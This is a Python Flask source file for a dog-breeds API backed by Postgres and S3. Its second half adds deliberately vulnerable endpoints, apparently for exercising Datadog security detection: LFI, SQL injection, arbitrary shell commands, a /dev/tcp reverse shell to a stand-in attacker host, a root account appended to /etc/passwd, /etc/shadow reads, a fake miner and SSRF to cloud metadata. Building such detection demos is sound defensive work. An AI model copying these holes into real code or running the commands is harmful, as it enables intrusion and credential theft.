import io
import os
import re
import time
import uuid

import boto3
import psycopg2
from PIL import Image
from flask import Flask, jsonify, request, send_file

app = Flask(__name__)

S3_BUCKET = os.environ.get('S3_BUCKET')
AWS_REGION = os.environ.get('AWS_REGION', 'eu-west-2')


def _breed_to_key(breed):
    pascal = ''.join(w.capitalize() for w in re.split(r'\s+', breed.strip()))
    safe = re.sub(r'[^A-Za-z0-9]', '', pascal)
    return f'dogs/{safe}.webp'


def _to_webp_bytes(photo):
    img = Image.open(photo.stream)
    if img.mode in ('RGBA', 'LA', 'P'):
        img = img.convert('RGBA')
    else:
        img = img.convert('RGB')
    buf = io.BytesIO()
    img.save(buf, format='WEBP', quality=85)
    buf.seek(0)
    return buf
DB_HOST = os.environ.get('DB_HOST', 'postgres')
DB_NAME = os.environ.get('DB_NAME', 'dogsdb')
DB_USER = os.environ.get('DB_USER', 'postgres')
DB_PASSWORD = os.environ.get('DB_PASSWORD', 'postgres')

s3 = boto3.client('s3', region_name=AWS_REGION)


def get_db():
    return psycopg2.connect(
        host=DB_HOST, dbname=DB_NAME, user=DB_USER, password=DB_PASSWORD
    )


def init_db():
    for attempt in range(30):
        try:
            conn = get_db()
            cur = conn.cursor()
            cur.execute('''
                CREATE TABLE IF NOT EXISTS dogs (
                    id UUID PRIMARY KEY,
                    breed VARCHAR(255) NOT NULL,
                    description TEXT,
                    photo_key VARCHAR(500),
                    created_at TIMESTAMP DEFAULT NOW()
                )
            ''')
            conn.commit()
            cur.close()
            conn.close()
            print('Database initialized successfully')
            return
        except psycopg2.OperationalError:
            print(f'Waiting for PostgreSQL... attempt {attempt + 1}/30')
            time.sleep(2)
    raise RuntimeError('Could not connect to PostgreSQL after 30 attempts')


@app.route('/')
def index():
    return jsonify(message='Welcome to the Dog Breeds API!')


@app.route('/health')
def health():
    return jsonify(status='ok')


@app.route('/dogs', methods=['GET'])
def list_dogs():
    conn = get_db()
    cur = conn.cursor()
    cur.execute(
        'SELECT id, breed, description, photo_key, created_at '
        'FROM dogs ORDER BY created_at DESC'
    )
    dogs = []
    for row in cur.fetchall():
        photo_url = f'/photos/{row[0]}' if row[3] else None
        dogs.append({
            'id': str(row[0]),
            'breed': row[1],
            'description': row[2],
            'photo_url': photo_url,
            'created_at': row[4].isoformat(),
        })
    cur.close()
    conn.close()
    return jsonify(dogs)


@app.route('/dogs/<dog_id>', methods=['GET'])
def get_dog(dog_id):
    conn = get_db()
    cur = conn.cursor()
    cur.execute(
        'SELECT id, breed, description, photo_key, created_at '
        'FROM dogs WHERE id = %s',
        (dog_id,),
    )
    row = cur.fetchone()
    cur.close()
    conn.close()
    if not row:
        return jsonify(error='Not found'), 404
    photo_url = f'/photos/{row[0]}' if row[3] else None
    return jsonify({
        'id': str(row[0]),
        'breed': row[1],
        'description': row[2],
        'photo_url': photo_url,
        'created_at': row[4].isoformat(),
    })


@app.route('/photos/<dog_id>', methods=['GET'])
def get_photo(dog_id):
    conn = get_db()
    cur = conn.cursor()
    cur.execute('SELECT photo_key FROM dogs WHERE id = %s', (dog_id,))
    row = cur.fetchone()
    cur.close()
    conn.close()
    if not row or not row[0]:
        return jsonify(error='Not found'), 404
    obj = s3.get_object(Bucket=S3_BUCKET, Key=row[0])
    return send_file(
        io.BytesIO(obj['Body'].read()),
        mimetype=obj.get('ContentType', 'image/jpeg'),
    )


@app.route('/dogs/<dog_id>', methods=['PUT'])
def update_dog(dog_id):
    conn = get_db()
    cur = conn.cursor()
    cur.execute('SELECT id, photo_key FROM dogs WHERE id = %s', (dog_id,))
    row = cur.fetchone()
    if not row:
        cur.close()
        conn.close()
        return jsonify(error='Not found'), 404

    breed = request.form.get('breed')
    description = request.form.get('description')
    photo = request.files.get('photo')

    if not breed:
        cur.close()
        conn.close()
        return jsonify(error='breed is required'), 400

    photo_key = row[1]
    if photo:
        photo_key = _breed_to_key(breed)
        s3.upload_fileobj(
            _to_webp_bytes(photo), S3_BUCKET, photo_key,
            ExtraArgs={'ContentType': 'image/webp'},
        )

    cur.execute(
        'UPDATE dogs SET breed = %s, description = %s, photo_key = %s WHERE id = %s',
        (breed, description, photo_key, dog_id),
    )
    conn.commit()
    cur.close()
    conn.close()
    return jsonify(id=dog_id, breed=breed, description=description)


@app.route('/dogs/<dog_id>', methods=['DELETE'])
def delete_dog(dog_id):
    conn = get_db()
    cur = conn.cursor()
    cur.execute('SELECT photo_key FROM dogs WHERE id = %s', (dog_id,))
    row = cur.fetchone()
    if not row:
        cur.close()
        conn.close()
        return jsonify(error='Not found'), 404

    if row[0]:
        try:
            s3.delete_object(Bucket=S3_BUCKET, Key=row[0])
        except Exception:
            pass

    cur.execute('DELETE FROM dogs WHERE id = %s', (dog_id,))
    conn.commit()
    cur.close()
    conn.close()
    return jsonify(ok=True)


@app.route('/dogs', methods=['POST'])
def create_dog():
    breed = request.form.get('breed')
    description = request.form.get('description', '')
    photo = request.files.get('photo')

    if not breed:
        return jsonify(error='breed is required'), 400

    dog_id = uuid.uuid4()
    photo_key = None

    if photo:
        photo_key = _breed_to_key(breed)
        s3.upload_fileobj(
            _to_webp_bytes(photo), S3_BUCKET, photo_key,
            ExtraArgs={'ContentType': 'image/webp'},
        )

    conn = get_db()
    cur = conn.cursor()
    cur.execute(
        'INSERT INTO dogs (id, breed, description, photo_key) '
        'VALUES (%s, %s, %s, %s)',
        (str(dog_id), breed, description, photo_key),
    )
    conn.commit()
    cur.close()
    conn.close()

    return jsonify(id=str(dog_id), breed=breed, description=description), 201


# ==========================================================================
# Intentionally vulnerable + crashing endpoints — for Datadog demos only.
# Gated by ENABLE_VULN_ENDPOINTS=true so they cannot run in real prod.
# Exercises:
#   - Error Tracking (unhandled exceptions, OOM)
#   - APM (slow / failing spans)
#   - ASM / App Security (LFI, SQLi, command injection)
# DO NOT EXPOSE OUTSIDE A SANDBOX.
# ==========================================================================
ENABLE_VULN_ENDPOINTS = os.environ.get('ENABLE_VULN_ENDPOINTS', 'false').lower() == 'true'


@app.route('/vuln/crash/divide-by-zero')
def vuln_divide_by_zero():
    if not ENABLE_VULN_ENDPOINTS:
        return jsonify(error='vuln endpoints disabled'), 404
    return jsonify(result=1 / 0)


@app.route('/vuln/crash/exception')
def vuln_unhandled():
    if not ENABLE_VULN_ENDPOINTS:
        return jsonify(error='vuln endpoints disabled'), 404
    raise RuntimeError('intentional crash for demo')


@app.route('/vuln/crash/oom')
def vuln_oom():
    if not ENABLE_VULN_ENDPOINTS:
        return jsonify(error='vuln endpoints disabled'), 404
    # Allocate ~1 GiB chunks until the container's memory limit kicks in.
    blobs = []
    while True:
        blobs.append(b'\x00' * (1024 * 1024 * 1024))


@app.route('/vuln/crash/slow')
def vuln_slow():
    if not ENABLE_VULN_ENDPOINTS:
        return jsonify(error='vuln endpoints disabled'), 404
    seconds = float(request.args.get('seconds', '5'))
    time.sleep(seconds)
    return jsonify(slept=seconds)


@app.route('/vuln/crash/cpu')
def vuln_cpu():
    if not ENABLE_VULN_ENDPOINTS:
        return jsonify(error='vuln endpoints disabled'), 404
    # Burn one core for ~10s.
    end = time.time() + 10
    n = 0
    while time.time() < end:
        n += 1
    return jsonify(iterations=n)


@app.route('/vuln/lfi')
def vuln_lfi():
    """Classic Local File Inclusion — no path sanitization.
    Example: /vuln/lfi?file=/etc/passwd
    """
    if not ENABLE_VULN_ENDPOINTS:
        return jsonify(error='vuln endpoints disabled'), 404
    path = request.args.get('file', '')
    with open(path, 'r') as f:
        return f.read(), 200, {'Content-Type': 'text/plain'}


@app.route('/vuln/sqli')
def vuln_sqli():
    """Classic SQL injection — string interpolation into the WHERE clause.
    Example: /vuln/sqli?breed=' OR '1'='1
    """
    if not ENABLE_VULN_ENDPOINTS:
        return jsonify(error='vuln endpoints disabled'), 404
    breed = request.args.get('breed', '')
    conn = get_db()
    cur = conn.cursor()
    cur.execute(f"SELECT id, breed, description FROM dogs WHERE breed = '{breed}'")
    rows = [{'id': str(r[0]), 'breed': r[1], 'description': r[2]} for r in cur.fetchall()]
    cur.close()
    conn.close()
    return jsonify(rows)


@app.route('/vuln/cmd')
def vuln_cmd():
    """Command injection via os.system — no escaping.
    Example: /vuln/cmd?cmd=id
    """
    if not ENABLE_VULN_ENDPOINTS:
        return jsonify(error='vuln endpoints disabled'), 404
    import subprocess
    cmd = request.args.get('cmd', 'echo hello')
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=5)
    return jsonify(stdout=result.stdout, stderr=result.stderr, returncode=result.returncode)


@app.route('/vuln/cws/passwd-write')
def vuln_cws_passwd_write():
    """Triggers CWS rule: modification of /etc/passwd / sensitive file."""
    if not ENABLE_VULN_ENDPOINTS:
        return jsonify(error='vuln endpoints disabled'), 404
    import subprocess
    subprocess.run('echo "hacker:x:0:0::/root:/bin/sh" >> /etc/passwd', shell=True)
    return jsonify(ok=True, action='appended to /etc/passwd')


@app.route('/vuln/cws/spawn-shell')
def vuln_cws_spawn_shell():
    """Triggers CWS rule: interactive shell spawned inside container."""
    if not ENABLE_VULN_ENDPOINTS:
        return jsonify(error='vuln endpoints disabled'), 404
    import subprocess
    out = subprocess.run(['/bin/sh', '-c', 'id && whoami && uname -a'],
                         capture_output=True, text=True, timeout=5)
    return jsonify(stdout=out.stdout)


@app.route('/vuln/cws/discovery')
def vuln_cws_discovery():
    """Triggers CWS rules: recon/discovery commands chained."""
    if not ENABLE_VULN_ENDPOINTS:
        return jsonify(error='vuln endpoints disabled'), 404
    import subprocess
    cmd = 'whoami; id; hostname; uname -a; cat /etc/shadow 2>&1 | head; ip a; netstat -an 2>&1 | head'
    out = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
    return jsonify(stdout=out.stdout, stderr=out.stderr)


@app.route('/vuln/cws/crypto-miner')
def vuln_cws_crypto_miner():
    """Triggers CWS rule: process name matches known crypto-miner pattern."""
    if not ENABLE_VULN_ENDPOINTS:
        return jsonify(error='vuln endpoints disabled'), 404
    import subprocess
    # Spawn a short-lived process renamed to xmrig — CWS matches on argv[0].
    proc = subprocess.Popen(['/bin/sh', '-c', 'exec -a xmrig sleep 30'])
    return jsonify(pid=proc.pid, name='xmrig')


@app.route('/vuln/cws/reverse-shell')
def vuln_cws_reverse_shell():
    """Triggers CWS rule: outbound connection then shell exec — reverse shell.
    Example: /vuln/cws/reverse-shell?host=attacker.example.com&port=4444
    Will fail to actually connect without a listener, but the syscall pattern is enough.
    """
    if not ENABLE_VULN_ENDPOINTS:
        return jsonify(error='vuln endpoints disabled'), 404
    import subprocess
    host = request.args.get('host', '127.0.0.1')
    port = request.args.get('port', '4444')
    cmd = (f'sh -i 5<> /dev/tcp/{host}/{port} 0<&5 1>&5 2>&5 &')
    subprocess.run(cmd, shell=True, capture_output=True, timeout=3)
    return jsonify(attempted=True, host=host, port=port)


@app.route('/vuln/cws/ld-preload')
def vuln_cws_ld_preload():
    """Triggers CWS rule: LD_PRELOAD set to user-writable path."""
    if not ENABLE_VULN_ENDPOINTS:
        return jsonify(error='vuln endpoints disabled'), 404
    import subprocess
    out = subprocess.run(['/bin/sh', '-c', 'LD_PRELOAD=/tmp/evil.so id'],
                         capture_output=True, text=True, timeout=5)
    return jsonify(stdout=out.stdout, stderr=out.stderr)


@app.route('/vuln/cws/kernel-module')
def vuln_cws_kernel_module():
    """Triggers CWS rule: kernel module manipulation attempt."""
    if not ENABLE_VULN_ENDPOINTS:
        return jsonify(error='vuln endpoints disabled'), 404
    import subprocess
    out = subprocess.run(['/bin/sh', '-c', 'lsmod; insmod /tmp/evil.ko 2>&1; modprobe evil 2>&1'],
                         capture_output=True, text=True, timeout=5)
    return jsonify(stdout=out.stdout, stderr=out.stderr)


@app.route('/vuln/ssrf')
def vuln_ssrf():
    """Server-Side Request Forgery — fetches arbitrary URL server-side.
    Example: /vuln/ssrf?url=http://169.254.169.254/latest/meta-data/
    """
    if not ENABLE_VULN_ENDPOINTS:
        return jsonify(error='vuln endpoints disabled'), 404
    import urllib.request
    url = request.args.get('url', '')
    with urllib.request.urlopen(url, timeout=5) as resp:
        body = resp.read(4096).decode('utf-8', errors='replace')
    return jsonify(url=url, body=body)


if __name__ == '__main__':
    init_db()
    app.run(host='0.0.0.0', port=8080)
